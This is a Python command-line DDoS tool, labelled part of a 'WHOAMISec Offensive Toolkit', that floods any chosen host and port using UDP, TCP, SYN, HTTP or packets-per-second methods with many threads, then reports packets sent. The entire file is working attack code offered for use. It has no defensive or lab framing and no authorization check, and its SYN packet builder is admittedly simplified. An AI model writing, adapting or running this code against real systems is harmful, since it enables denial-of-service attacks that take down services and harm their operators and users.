#!/usr/bin/env python3
"""
ITs DDoS Tool - WHOAMISec Offensive Toolkit
Advanced DDoS attack tool with multiple methods
Based on ITs Panel DDoS by Lintar
"""

import sys
import argparse
import socket
import threading
import time
import random
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

class ITsDDoS:
    def __init__(self):
        self.attack_methods = {
            'UDP': self.udp_flood,
            'TCP': self.tcp_flood,
            'SYN': self.syn_flood,
            'HTTP': self.http_flood,
            'PPS': self.pps_flood
        }
    
    def udp_flood(self, target, port, duration, threads=50):
        """UDP flood attack"""
        def attack():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                end_time = time.time() + duration
                packet_count = 0
                
                while time.time() < end_time:
                    try:
                        # Create random payload
                        payload = random._urandom(1024)
                        sock.sendto(payload, (target, port))
                        packet_count += 1
                    except:
                        break
                
                return packet_count
            except:
                return 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            total_packets = sum(future.result() for future in futures)
        
        return total_packets
    
    def tcp_flood(self, target, port, duration, threads=50):
        """TCP flood attack"""
        def attack():
            packet_count = 0
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    
                    # Send random data
                    payload = random._urandom(1024)
                    sock.send(payload)
                    packet_count += 1
                    
                    sock.close()
                except:
                    continue
            
            return packet_count
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            total_packets = sum(future.result() for future in futures)
        
        return total_packets
    
    def syn_flood(self, target, port, duration, threads=50):
        """SYN flood attack"""
        def attack():
            packet_count = 0
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    
                    # Create SYN packet
                    source_port = random.randint(1024, 65535)
                    seq_num = random.randint(0, 2**32 - 1)
                    
                    # Simple SYN packet (simplified for demonstration)
                    packet = self.create_syn_packet(target, port, source_port, seq_num)
                    
                    sock.sendto(packet, (target, 0))
                    packet_count += 1
                except:
                    # Fallback to regular TCP if raw sockets not available
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        sock.connect_ex((target, port))
                        packet_count += 1
                    except:
                        continue
            
            return packet_count
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            total_packets = sum(future.result() for future in futures)
        
        return total_packets
    
    def http_flood(self, target, port, duration, threads=50):
        """HTTP flood attack"""
        def attack():
            packet_count = 0
            end_time = time.time() + duration
            
            # Common HTTP request templates
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            ]
            
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    
                    # Create HTTP request
                    user_agent = random.choice(user_agents)
                    request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nConnection: close\r\n\r\n"
                    
                    sock.send(request.encode())
                    packet_count += 1
                    
                    sock.close()
                except:
                    continue
            
            return packet_count
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            total_packets = sum(future.result() for future in futures)
        
        return total_packets
    
    def pps_flood(self, target, port, duration, threads=50):
        """Packets per second flood"""
        def attack():
            packet_count = 0
            end_time = time.time() + duration
            
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.1)
                    
                    # Send minimal packet
                    payload = b'\x00' * 1  # 1 byte payload
                    sock.sendto(payload, (target, port))
                    packet_count += 1
                    
                    sock.close()
                except:
                    continue
            
            return packet_count
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            total_packets = sum(future.result() for future in futures)
        
        return total_packets
    
    def create_syn_packet(self, target, port, source_port, seq_num):
        """Create a simple SYN packet (simplified)"""
        # This is a simplified version - in practice you'd need proper packet crafting
        # For demonstration purposes, we'll create a minimal packet
        
        # IP header (simplified)
        ip_header = b'\x45\x00\x00\x28\x00\x00\x40\x00\x40\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        
        # TCP header (simplified SYN packet)
        tcp_header = (
            source_port.to_bytes(2, 'big') +  # Source port
            port.to_bytes(2, 'big') +         # Destination port
            seq_num.to_bytes(4, 'big') +      # Sequence number
            b'\x00\x00\x00\x00' +              # Acknowledgment number
            b'\x50\x02\x00\x00' +              # Data offset and SYN flag
            b'\x00\x00\x00\x00'                # Window size and checksum
        )
        
        return ip_header + tcp_header
    
    def resolve_target(self, target):
        """Resolve hostname to IP address"""
        try:
            ip = socket.gethostbyname(target)
            return ip
        except socket.gaierror:
            return None
    
    def run_attack(self, method, target, port, duration, threads=50):
        """Run the specified attack method"""
        if method not in self.attack_methods:
            return None
        
        # Resolve target
        target_ip = self.resolve_target(target)
        if not target_ip:
            return {
                'success': False,
                'error': f'Failed to resolve target: {target}',
                'packets_sent': 0
            }
        
        print(f"[*] Starting {method} attack on {target_ip}:{port} for {duration}s with {threads} threads")
        
        start_time = time.time()
        packets_sent = self.attack_methods[method](target_ip, port, duration, threads)
        end_time = time.time()
        
        actual_duration = end_time - start_time
        
        return {
            'success': True,
            'method': method,
            'target': target,
            'target_ip': target_ip,
            'port': port,
            'duration': actual_duration,
            'packets_sent': packets_sent,
            'pps': packets_sent / actual_duration if actual_duration > 0 else 0
        }

def main():
    parser = argparse.ArgumentParser(description='ITs DDoS Tool - WHOAMISec Offensive Toolkit')
    parser.add_argument('--target', required=True, help='Target IP or hostname')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('--method', default='UDP', choices=['UDP', 'TCP', 'SYN', 'HTTP', 'PPS'], help='Attack method (default: UDP)')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('--output', choices=['json', 'text'], default='json', help='Output format')
    
    args = parser.parse_args()
    
    print(f"[*] ITs DDoS Tool - WHOAMISec Offensive Toolkit")
    print(f"[*] Method: {args.method}")
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] Threads: {args.threads}")
    
    ddos = ITsDDoS()
    result = ddos.run_attack(args.method, args.target, args.port, args.duration, args.threads)
    
    if result is None:
        print(f"[-] Invalid attack method: {args.method}")
        sys.exit(1)
    
    if not result['success']:
        print(f"[-] Attack failed: {result['error']}")
        sys.exit(1)
    
    # Output results
    if args.output == 'json':
        print(json.dumps({
            "tool": "its-ddos-tool",
            "timestamp": datetime.now().isoformat(),
            "attack": result
        }, indent=2))
    else:
        print("\n" + "="*60)
        print("ATTACK RESULTS")
        print("="*60)
        print(f"Method: {result['method']}")
        print(f"Target: {result['target']} ({result['target_ip']})")
        print(f"Port: {result['port']}")
        print(f"Duration: {result['duration']:.2f}s")
        print(f"Packets Sent: {result['packets_sent']}")
        print(f"Packets/Second: {result['pps']:.2f}")
        print("="*60)

if __name__ == '__main__':
    main()